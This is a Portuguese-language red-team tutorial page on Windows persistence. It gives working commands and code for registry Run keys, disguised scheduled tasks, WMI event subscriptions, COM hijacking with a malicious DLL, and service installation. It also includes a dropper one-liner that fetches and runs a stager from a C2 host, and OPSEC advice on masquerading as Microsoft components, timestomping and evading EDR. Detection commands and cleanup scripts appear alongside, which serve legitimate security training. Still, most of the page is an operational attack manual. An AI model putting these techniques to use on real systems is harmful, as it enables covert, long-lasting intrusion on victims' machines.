---
layout: cyber
section: pos-expl-windows
title: "Persistência no Windows"
---

# Persistência no Windows

## Resiliência Define APT

Persistência é a capacidade de manter acesso a sistema comprometido mesmo após reboot, logoff, troca de credencial ou remoção de artefato superficial. Pra red teamer, persistência furtiva separa comprometimento efêmero de acesso duradouro capaz de simular APT real. Diferença entre persistência e shell reverso simples é resiliência: se processo morre, sistema reinicia ou usuário desloga, o acesso deve ser reestabelecido automaticamente. Cada mecanismo tem perfil de risco diferente — alguns caem trivialmente em EDR moderno, outros vivem em áreas do sistema que defensores raramente inspecionam. MITRE ATT&CK: tática TA0003 (Persistence), com dezenas de técnicas.

---

## Gatilhos do Windows e o Que Abusar

### Modelo Mental

O Windows executa código automaticamente em resposta a diversos gatilhos: inicialização do sistema, logon de usuário, criação de processo, horários agendados, eventos do sistema. Qualquer um desses gatilhos pode ser usado para reexecutar um payload. O objetivo do atacante é registrar seu payload como "código legítimo que deve ser executado quando X acontecer".

### Hierarquia de Privilégio

As técnicas se dividem em dois grupos principais:

- **Sem privilégio administrativo (HKCU, usuário atual)**: Persistência sobrevive apenas enquanto aquele usuário logar. Mais fácil de criar, mais limitada em escopo.
- **Com privilégio administrativo (HKLM, SYSTEM)**: Persistência afeta todos os usuários ou roda como SYSTEM. Mais poderosa, mais fácil de detectar por ferramentas de defesa.

---

## Na Prática

### 1. Registry Autoruns

O Registro do Windows é o vetor mais antigo e mais monitorado. Ainda assim, funciona quando EDRs não estão presentes ou quando CLSIDs e chaves menos conhecidas são usadas.

**Chaves principais para execução por usuário (sem admin):**

```
HKCU\Software\Microsoft\Windows\CurrentVersion\Run
HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices
```

**Chaves para todos os usuários (requer admin):**

```
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
```

**Outras chaves de alto valor:**

```
HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
  → Userinit: normalmente "C:\Windows\system32\userinit.exe,"
  → Shell: normalmente "explorer.exe"
  → Adicionar payload: "C:\Windows\system32\userinit.exe, C:\payload.exe"

HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify
  → DLLs carregadas em eventos de logon/logoff

HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\[processo]
  → Debugger: substituir depurador de um executável legítimo por payload
  → Ex: Image File Execution Options\sethc.exe → Debugger = cmd.exe

HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\AppInit_DLLs
  → DLLs injetadas em todos os processos que carregam user32.dll
  → Muito barulhento, evitar em engagements modernos

HKLM\SYSTEM\CurrentControlSet\Services
  → Serviços do Windows — ver seção dedicada abaixo
```

**OPSEC Rating: 2/5** — Muito monitorado. Ferramentas como Autoruns (Sysinternals), Defender e praticamente qualquer EDR verificam essas chaves. Usar apenas quando sem EDR ou como distração.

### 2. Adicionar Autorun via Linha de Comando

**Adicionar entrada HKCU (sem admin):**

```cmd
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" ^
  /v "WindowsDefenderHealth" ^
  /t REG_SZ ^
  /d "C:\Users\Public\svchost.exe" ^
  /f
```

**Adicionar entrada HKLM (requer admin):**

```cmd
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" ^
  /v "WindowsUpdateService" ^
  /t REG_SZ ^
  /d "C:\Windows\Temp\update.exe" ^
  /f
```

**Verificar o que foi adicionado:**

```cmd
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
```

**Remover entrada (limpeza):**

```cmd
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsDefenderHealth" /f
```

**Via PowerShell:**

```powershell
# Adicionar
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
  -Name "WindowsDefenderHealth" `
  -Value "C:\Users\Public\svchost.exe"

# Verificar
Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"

# Remover
Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
  -Name "WindowsDefenderHealth"
```

---

### 3. Scheduled Tasks (Tarefas Agendadas)

Tarefas agendadas oferecem mais flexibilidade que autoruns simples: podem rodar como SYSTEM sem estar logado, executar em intervalos, responder a eventos, ou disfarçar-se como tarefas legítimas do sistema.

**OPSEC Rating: 2/5** — Monitorado, mas menos que autoruns puros. Nome e descrição convincentes ajudam. Defender e EDRs modernos têm detecção específica para criação de scheduled tasks via schtasks.exe e Register-ScheduledTask.

**Criar tarefa via schtasks (cmd):**

```cmd
schtasks /create /tn "\Microsoft\Windows\WindowsUpdate\ScheduledStart" ^
  /tr "C:\Windows\Temp\update.exe" ^
  /sc onlogon ^
  /ru SYSTEM ^
  /f
```

**Triggers disponíveis:**

```cmd
# Ao fazer logon
/sc onlogon

# Na inicialização do sistema
/sc onstart

# No idle (sistema ocioso)
/sc onidle /i 10

# Em horário específico, diariamente
/sc daily /st 09:00

# A cada X minutos
/sc minute /mo 30

# Ao conectar a uma sessão (bom para RDP)
/sc onlogon /ru "DOMAIN\usuario"
```

**Exemplo com múltiplos triggers e disfarce convincente:**

```cmd
schtasks /create ^
  /tn "\Microsoft\Windows\Maintenance\WinSAT" ^
  /tr "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle Hidden -enc BASE64PAYLOAD" ^
  /sc daily /st 10:00 ^
  /ru SYSTEM ^
  /rl HIGHEST ^
  /f
```

**Via PowerShell (mais flexibilidade, mais furtivo que schtasks.exe):**

```powershell
$action = New-ScheduledTaskAction `
  -Execute "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" `
  -Argument "-WindowStyle Hidden -enc BASE64ENCODEDPAYLOAD"

$trigger = New-ScheduledTaskTrigger -AtLogOn

$settings = New-ScheduledTaskSettingsSet `
  -Hidden `
  -AllowStartIfOnBatteries `
  -DontStopIfGoingOnBatteries

$principal = New-ScheduledTaskPrincipal `
  -UserId "SYSTEM" `
  -LogonType ServiceAccount `
  -RunLevel Highest

Register-ScheduledTask `
  -TaskName "\Microsoft\Windows\Maintenance\WinSAT" `
  -Action $action `
  -Trigger $trigger `
  -Settings $settings `
  -Principal $principal `
  -Description "Windows System Assessment Tool" `
  -Force
```

**Verificar tarefas existentes:**

```cmd
schtasks /query /fo LIST /v | findstr /i "task name\|run as\|status\|task to run"
schtasks /query /tn "\Microsoft\Windows\Maintenance\WinSAT" /fo LIST /v
```

**Via Cobalt Strike (beacon command):**

```
# Criar scheduled task no beacon
scheduledtask create "WindowsUpdate" "C:\Windows\Temp\update.exe" SYSTEM

# Listar todas as tarefas
scheduledtask list

# Deletar
scheduledtask delete "WindowsUpdate"
```

**Dicas de OPSEC para scheduled tasks:**

1. Use caminhos de subpastas dentro de `\Microsoft\Windows\` — parecem mais legítimos
2. Coloque descrição convincente (copie de uma tarefa legítima existente)
3. Configure `Hidden = true` nas propriedades
4. Use `-WindowStyle Hidden` se for PowerShell
5. Considere usar o caminho completo do executável alvo
6. Evite nomes como "Persistence", "Backdoor", "RAT", "C2"
7. Prefira triggers de evento em vez de tempo fixo para parecer mais orgânico

---

### 4. WMI Event Subscriptions (Método Mais Furtivo)

WMI (Windows Management Instrumentation) subscriptions são uma das técnicas de persistência mais furtivas disponíveis no Windows. Elas não ficam no registro de forma visível, não aparecem em schtasks, e residem no repositório WMI — uma área frequentemente negligenciada por defensores.

**OPSEC Rating: 4/5** — Alta furtividade. Não aparece em autoruns padrão, não aparece em schtasks. Requer inspeção direta do namespace WMI root\subscription. Cobalt Strike, Empire, e outros C2s têm módulos dedicados.

**Três componentes obrigatórios:**

#### Componente 1: EventFilter (A Condição)

Define QUANDO o código será executado. Usa WQL (WMI Query Language):

```powershell
# Exemplo 1: Disparar quando um processo específico inicia
$filterQuery = "SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name = 'explorer.exe'"

# Exemplo 2: Disparar a cada 60 segundos (timer)
$filterQuery = "SELECT * FROM __TimerEvent WHERE TimerID = 'PersistenceTimer'"

# Criar o EventFilter
$filterArgs = @{
    EventNamespace = "root\cimv2"
    Name           = "WindowsDefenderFilter"
    Query          = $filterQuery
    QueryLanguage  = "WQL"
}
$filter = New-CimInstance -Namespace "root\subscription" `
                          -ClassName "__EventFilter" `
                          -Property $filterArgs
```

#### Componente 2: EventConsumer (A Ação)

Define O QUE acontece quando o filtro dispara:

```powershell
# CommandLineEventConsumer: executa um comando
$consumerArgs = @{
    Name                = "WindowsDefenderConsumer"
    CommandLineTemplate = "C:\Windows\System32\cmd.exe /c C:\Windows\Temp\update.exe"
}
$consumer = New-CimInstance -Namespace "root\subscription" `
                            -ClassName "CommandLineEventConsumer" `
                            -Property $consumerArgs

# Alternativa: ActiveScriptEventConsumer (executa VBScript/JScript)
$scriptConsumerArgs = @{
    Name             = "WindowsUpdateScript"
    ScriptingEngine  = "VBScript"
    ScriptText       = 'Set oShell = CreateObject("WScript.Shell") : oShell.Run "C:\Windows\Temp\update.exe", 0, False'
}
$scriptConsumer = New-CimInstance -Namespace "root\subscription" `
                                  -ClassName "ActiveScriptEventConsumer" `
                                  -Property $scriptConsumerArgs
```

#### Componente 3: FilterToConsumerBinding (A Ligação)

Liga o filtro ao consumer — sem isso, os dois componentes existem mas não interagem:

```powershell
$bindingArgs = @{
    Filter   = [Ref] $filter
    Consumer = [Ref] $consumer
}
$binding = New-CimInstance -Namespace "root\subscription" `
                           -ClassName "__FilterToConsumerBinding" `
                           -Property $bindingArgs
```

**Exemplo completo end-to-end — persistência que dispara quando explorer.exe inicia (usuário faz logon):**

```powershell
# --- STEP 1: EventFilter ---
$filterArgs = @{
    EventNamespace = "root\cimv2"
    Name           = "MicrosoftWinUpdateFilter"
    Query          = "SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name = 'explorer.exe'"
    QueryLanguage  = "WQL"
}
$filter = New-CimInstance -Namespace "root\subscription" `
                          -ClassName "__EventFilter" `
                          -Property $filterArgs

# --- STEP 2: EventConsumer ---
$consumerArgs = @{
    Name                = "MicrosoftWinUpdateConsumer"
    CommandLineTemplate = 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle Hidden -enc AABBCC...'
}
$consumer = New-CimInstance -Namespace "root\subscription" `
                            -ClassName "CommandLineEventConsumer" `
                            -Property $consumerArgs

# --- STEP 3: Binding ---
New-CimInstance -Namespace "root\subscription" `
                -ClassName "__FilterToConsumerBinding" `
                -Property @{
                    Filter   = [Ref] $filter
                    Consumer = [Ref] $consumer
                }

Write-Host "[+] WMI persistence installed"
```

**Onde os dados ficam armazenados:**

Os objetos WMI são armazenados no repositório WMI localizado em:

```
C:\Windows\System32\wbem\Repository\
  OBJECTS.DATA  ← banco de dados principal
  INDEX.BTR     ← índice
  MAPPING*.MAP  ← mapeamentos
```

Não é um arquivo de texto legível, e não aparece no registro padrão. Isso é o que torna WMI subscriptions difíceis de detectar por ferramentas que só verificam o registro.

**Detectar WMI persistence existente:**

```powershell
# Verificar filtros
Get-CimInstance -Namespace root\subscription -ClassName __EventFilter |
  Select-Object Name, Query | Format-List

# Verificar consumers
Get-CimInstance -Namespace root\subscription -ClassName CommandLineEventConsumer |
  Select-Object Name, CommandLineTemplate | Format-List

Get-CimInstance -Namespace root\subscription -ClassName ActiveScriptEventConsumer |
  Select-Object Name, ScriptText | Format-List

# Verificar bindings
Get-CimInstance -Namespace root\subscription -ClassName __FilterToConsumerBinding |
  Format-List
```

**Remover WMI persistence:**

```powershell
Get-CimInstance -Namespace root\subscription -ClassName __EventFilter |
  Where-Object {$_.Name -eq "MicrosoftWinUpdateFilter"} |
  Remove-CimInstance

Get-CimInstance -Namespace root\subscription -ClassName CommandLineEventConsumer |
  Where-Object {$_.Name -eq "MicrosoftWinUpdateConsumer"} |
  Remove-CimInstance

Get-CimInstance -Namespace root\subscription -ClassName __FilterToConsumerBinding |
  Where-Object {$_.Filter.Name -eq "MicrosoftWinUpdateFilter"} |
  Remove-CimInstance
```

**Via ferramenta legada (wmic):**

```cmd
wmic /namespace:"\\root\subscription" PATH __EventFilter GET Name, Query /FORMAT:LIST
wmic /namespace:"\\root\subscription" PATH CommandLineEventConsumer GET Name, CommandLineTemplate /FORMAT:LIST
```

---

### 5. COM Hijacking

COM (Component Object Model) hijacking explora a ordem de busca de CLSIDs no registro. Quando uma aplicação instancia um objeto COM, o Windows primeiro verifica `HKCU\Software\Classes\CLSID` antes de `HKLM\SOFTWARE\Classes\CLSID`. Se o atacante registrar um CLSID malicioso em HKCU, a DLL maliciosa será carregada no lugar da legítima.

**OPSEC Rating: 4/5** — Muito furtivo quando bem executado. Sem admin necessário (HKCU). Carga acontece dentro de processos legítimos. Difícil de detectar sem monitoramento específico de HKCU\Classes\CLSID.

**Passo 1: Encontrar CLSIDs vulneráveis com Process Monitor**

1. Abrir Procmon (Sysinternals Process Monitor) como admin
2. Adicionar filtros:
   - Operation = RegOpenKey
   - Result = NAME NOT FOUND
   - Path contains HKCU\Software\Classes\CLSID
3. Reiniciar ou fazer logoff/logon para capturar eventos de startup
4. Identificar CLSIDs que existem em HKLM mas não em HKCU

**CLSIDs comuns exploráveis:**

```
{B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}  ← WBEM Scripting Locator
{BCDE0395-E52F-467C-8E3D-C4579291692E}  ← MMDeviceEnumerator
{F3364BA0-65B9-11CE-A9BA-00AA004AE837}  ← explorado em scheduled tasks do sistema
```

**Passo 2: Criar a DLL maliciosa**

A DLL deve exportar a função `DllGetClassObject` para ser um servidor COM válido:

```c
// malicious_com.cpp
#include <windows.h>

// Executar payload e chamar o COM legítimo original (opcional para transparência)
void RunPayload() {
    // Executar payload de forma silenciosa
    STARTUPINFOA si = { sizeof(si) };
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    PROCESS_INFORMATION pi;
    CreateProcessA(NULL, 
                   "C:\\Windows\\Temp\\update.exe",
                   NULL, NULL, FALSE,
                   CREATE_NO_WINDOW,
                   NULL, NULL, &si, &pi);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
        RunPayload();
    }
    return TRUE;
}

// Export necessário para servidor COM
extern "C" __declspec(dllexport)
HRESULT DllGetClassObject(REFCLSID rclsid, REFIID riid, LPVOID *ppv) {
    return CLASS_E_CLASSNOTAVAILABLE;
}
```

**Compilar:**

```cmd
cl /LD malicious_com.cpp /Fe:com_payload.dll
```

**Passo 3: Registrar em HKCU (sem admin)**

```powershell
$clsid = "{B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}"
$dllPath = "C:\Users\Public\Libraries\com_payload.dll"

# Criar estrutura de registro
$regPath = "HKCU:\Software\Classes\CLSID\$clsid\InProcServer32"
New-Item -Path $regPath -Force | Out-Null
Set-ItemProperty -Path $regPath -Name "(Default)" -Value $dllPath
Set-ItemProperty -Path $regPath -Name "ThreadingModel" -Value "Apartment"
```

**Via reg.exe:**

```cmd
set CLSID={B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}
reg add "HKCU\Software\Classes\CLSID\%CLSID%\InProcServer32" /ve /t REG_SZ /d "C:\Users\Public\Libraries\com_payload.dll" /f
reg add "HKCU\Software\Classes\CLSID\%CLSID%\InProcServer32" /v "ThreadingModel" /t REG_SZ /d "Apartment" /f
```

**Verificar:**

```cmd
reg query "HKCU\Software\Classes\CLSID\{B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}\InProcServer32"
```

**Notas importantes de OPSEC para COM hijacking:**

- Escolha CLSIDs carregados por processos que rodam frequentemente (Explorer, tarefas agendadas)
- Se possível, faça a DLL "proxy" para a DLL legítima original para evitar quebra de funcionalidade
- Evite CLSIDs que causem crashes — isso levanta suspeitas
- A DLL maliciosa será carregada dentro do processo legítimo (Explorer, etc.)

---

### 6. Instalação de Serviço

Serviços do Windows rodam como processos em background, frequentemente como SYSTEM, e são reiniciados automaticamente. Requerem privilégios administrativos.

**OPSEC Rating: 2/5** — Monitorado por EDRs. Criação de serviço gera eventos de log 4697 (Security) e 7045 (System). Serviços novos com nomes/binários suspeitos são facilmente identificados.

**Criar serviço via sc.exe:**

```cmd
sc create "WindowsUpdateMgr" ^
  binPath= "C:\Windows\Temp\svchost.exe" ^
  type= own ^
  start= auto ^
  DisplayName= "Windows Update Manager" ^
  obj= "LocalSystem"

sc description "WindowsUpdateMgr" "Manages Windows Update operations and configuration"

sc start "WindowsUpdateMgr"
```

**Nota sobre espaços:** `sc` requer espaço após `=` em todos os parâmetros. `binPath= "..."` com espaço é obrigatório.

**Via PowerShell (mais furtivo — não invoca sc.exe):**

```powershell
New-Service -Name "WindowsUpdateMgr" `
            -BinaryPathName "C:\Windows\Temp\svchost.exe" `
            -StartupType Automatic `
            -DisplayName "Windows Update Manager" `
            -Description "Manages Windows Update operations and configuration"

Start-Service "WindowsUpdateMgr"
```

**Criar serviço que roda payload como SYSTEM com delay:**

```cmd
sc create "WinDefSvc" ^
  binPath= "cmd.exe /c start /b C:\Windows\Temp\payload.exe" ^
  type= own ^
  start= auto

sc config "WinDefSvc" start= delayed-auto
```

**Verificar serviços:**

```cmd
sc query "WindowsUpdateMgr"
sc qc "WindowsUpdateMgr"
Get-Service | Where-Object {$_.StartType -eq "Automatic"} | Sort-Object Name
```

**Dicas de OPSEC para serviços:**

1. Nomear o serviço de forma similar a serviços reais da Microsoft
2. Colocar o binário em `C:\Windows\System32\` ou `C:\Windows\SysWOW64\` se possível
3. Usar um payload que responde a SCM (Service Control Manager) corretamente (aceita STOP, START) — payloads que não respondem ao SCM são reiniciados ou marcados como falhos
4. Usar `start= delayed-auto` para reduzir visibilidade em análises de startup

---

## Exemplos de Código / Comandos

### Script de Inventário de Persistência (Ofensivo)

```powershell
# Verificar todas as formas de persistência no sistema atual

Write-Host "=== Registry Autoruns ===" -ForegroundColor Yellow
$runKeys = @(
    "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run",
    "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce",
    "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
    "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"
)
foreach ($key in $runKeys) {
    Write-Host "`n[$key]"
    if (Test-Path $key) {
        Get-ItemProperty -Path $key
    }
}

Write-Host "`n=== Scheduled Tasks ===" -ForegroundColor Yellow
Get-ScheduledTask | Where-Object {$_.TaskPath -notlike "\Microsoft\*" -or $_.State -eq "Ready"} |
  Select-Object TaskName, TaskPath, State | Format-Table -AutoSize

Write-Host "`n=== WMI Event Subscriptions ===" -ForegroundColor Yellow
Get-CimInstance -Namespace root\subscription -ClassName __EventFilter | Select-Object Name, Query
Get-CimInstance -Namespace root\subscription -ClassName CommandLineEventConsumer | Select-Object Name, CommandLineTemplate
Get-CimInstance -Namespace root\subscription -ClassName __FilterToConsumerBinding | Format-List

Write-Host "`n=== Services (Non-Microsoft) ===" -ForegroundColor Yellow
Get-WmiObject Win32_Service |
  Where-Object {$_.PathName -notlike "*System32*" -and $_.StartMode -eq "Auto"} |
  Select-Object Name, DisplayName, PathName | Format-List

Write-Host "`n=== COM Hijacking (HKCU Classes) ===" -ForegroundColor Yellow
if (Test-Path "HKCU:\Software\Classes\CLSID") {
    Get-ChildItem "HKCU:\Software\Classes\CLSID" | ForEach-Object {
        $inproc = "$($_.PSPath)\InProcServer32"
        if (Test-Path $inproc) {
            Write-Host "CLSID: $($_.PSChildName) -> $(Get-ItemPropertyValue $inproc -Name '(Default)')"
        }
    }
}
```

### One-Liner de Persistência Rápida (Dropper)

```powershell
# Persistência rápida via HKCU Run + PowerShell encoded
$payload = "IEX(New-Object Net.WebClient).DownloadString('http://C2_IP/stager.ps1')"
$encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($payload))
$cmd = "powershell.exe -WindowStyle Hidden -enc $encoded"
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
                 -Name "MicrosoftEdgeUpdater" -Value $cmd
```

### Limpeza Completa de Persistência Implantada

```powershell
# Remover registry autorun
Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
                    -Name "MicrosoftEdgeUpdater" -ErrorAction SilentlyContinue

# Remover scheduled task
Unregister-ScheduledTask -TaskName "WinSAT" -Confirm:$false -ErrorAction SilentlyContinue

# Remover WMI subscription
Get-CimInstance -Namespace root\subscription -ClassName __FilterToConsumerBinding |
  Remove-CimInstance -ErrorAction SilentlyContinue
Get-CimInstance -Namespace root\subscription -ClassName CommandLineEventConsumer |
  Where-Object Name -like "*WinUpdate*" |
  Remove-CimInstance -ErrorAction SilentlyContinue
Get-CimInstance -Namespace root\subscription -ClassName __EventFilter |
  Where-Object Name -like "*WinUpdate*" |
  Remove-CimInstance -ErrorAction SilentlyContinue

# Parar e remover serviço
Stop-Service "WindowsUpdateMgr" -Force -ErrorAction SilentlyContinue
sc.exe delete "WindowsUpdateMgr"

Write-Host "[+] Cleanup complete"
```

---

## Detecção e OPSEC

### Tabela de Rating por Técnica

| Técnica             | OPSEC | Admin? | Sobrevive Reboot | Escopo         | Notas                                      |
|---------------------|-------|--------|------------------|----------------|--------------------------------------------|
| HKCU\Run            | 2/5   | Nao    | Sim              | Usuário atual  | Altamente monitorado                       |
| HKLM\Run            | 2/5   | Sim    | Sim              | Todos usuários | Altamente monitorado                       |
| Winlogon Userinit   | 3/5   | Sim    | Sim              | Todos usuários | Menos verificado que Run keys              |
| AppInit_DLLs        | 1/5   | Sim    | Sim              | Sistema        | Extremamente barulhento, evitar            |
| Scheduled Task      | 2/5   | Opc.   | Sim              | Flexível       | Log 4698 gerado; nome convincente ajuda    |
| WMI Subscription    | 4/5   | Sim    | Sim              | Sistema        | Não visível em autoruns padrão             |
| COM Hijacking       | 4/5   | Nao    | Sim              | Usuário atual  | Executa dentro de proc legítimo            |
| Service Install     | 2/5   | Sim    | Sim              | SYSTEM         | Log 7045; EDRs detectam com facilidade     |
| Image File Exec Opt | 3/5   | Sim    | Sim              | Por processo   | Util para sticky keys (tela login SYSTEM)  |

### IDs de Eventos Windows para Detectar Persistência

```
# Scheduled Tasks
Event 4698 (Security) — A scheduled task was created
Event 4702 (Security) — A scheduled task was updated
Event 106  (TaskScheduler/Operational) — Task registered

# Services
Event 7045 (System) — A new service was installed
Event 4697 (Security) — A service was installed in the system

# Registry (requer auditoria habilitada)
Event 4657 (Security) — A registry value was modified
  Object Name: HKCU\Software\Microsoft\Windows\CurrentVersion\Run

# WMI
Event 5861 (WMI-Activity/Operational) — A new permanent event subscription was created
```

### Comandos de Detecção para Defensores

```powershell
# Verificar todos os autoruns (recomendado: usar Autoruns.exe da Sysinternals)
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
Get-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"

# Verificar tarefas suspeitas
Get-ScheduledTask | Where-Object {
    $_.Actions.Execute -notlike "*Windows*" -and
    $_.Actions.Execute -notlike "*Microsoft*"
} | Select-Object TaskName, @{N='Exec';E={$_.Actions.Execute}}

# Verificar WMI subscriptions (tudo que existe DEVE ser investigado)
Get-CimInstance -Namespace root\subscription -ClassName __EventFilter
Get-CimInstance -Namespace root\subscription -ClassName CommandLineEventConsumer
Get-CimInstance -Namespace root\subscription -ClassName ActiveScriptEventConsumer

# Verificar serviços com binários fora de System32
Get-WmiObject Win32_Service | Where-Object {
    $_.PathName -notmatch "System32|SysWOW64|Program Files"
} | Select-Object Name, PathName

# Verificar COM hijacks em HKCU
Get-ChildItem "HKCU:\Software\Classes\CLSID" -ErrorAction SilentlyContinue |
  ForEach-Object {
    $ip = Join-Path $_.PSPath "InProcServer32"
    if (Test-Path $ip) { Write-Warning "COM HKCU override: $($_.PSChildName)" }
  }
```

### Boas Práticas de OPSEC para Red Team

1. **Timestamp matching**: Após criar artefatos, ajustar timestamps para corresponder com arquivos do sistema (`(Get-Item "C:\payload.exe").LastWriteTime = (Get-Item "C:\Windows\System32\calc.exe").LastWriteTime`)
2. **Naming convention**: Nomes de tarefas/serviços devem corresponder ao padrão da Microsoft (CamelCase, sem abreviações óbvias)
3. **Binary path**: Colocar payloads em caminhos que passam revisão superficial (`C:\Windows\Temp\WinUpdate.exe`, `C:\ProgramData\Microsoft\Windows Defender\Platform\`)
4. **Evitar múltiplas formas simultâneas**: Usar uma técnica só para reduzir footprint
5. **Cleanup**: Sempre documentar o que foi criado e remover ao final do engagement
6. **Assinatura de binários**: Binários não assinados são sinalizados por Defender/EDR; considerar payloads em memória ou LOLBins

---

## Módulos Relacionados

`03_credenciais_windows.md` é o módulo anterior — credenciais coletadas permitem persistência mais privilegiada. `06_network_recon_e_discovery.md` precede lateral movement após persistência estabelecida. `08_movimentacao_lateral/03_pivoting_e_tunelamento.md` cobre tunelamento robusto necessário pra manter C2 ativo. MITRE ATT&CK: T1547.001 (Registry Run Keys), T1053.005 (Scheduled Task), T1546.003 (WMI Event Subscription), T1546.015 (COM Hijacking), T1543.003 (Windows Service).

---

## Leitura Complementar

- Autoruns.exe (Sysinternals) — referência pra todos os pontos de autorun do Windows
- Seatbelt — enumeração de persistência durante post-exploitation
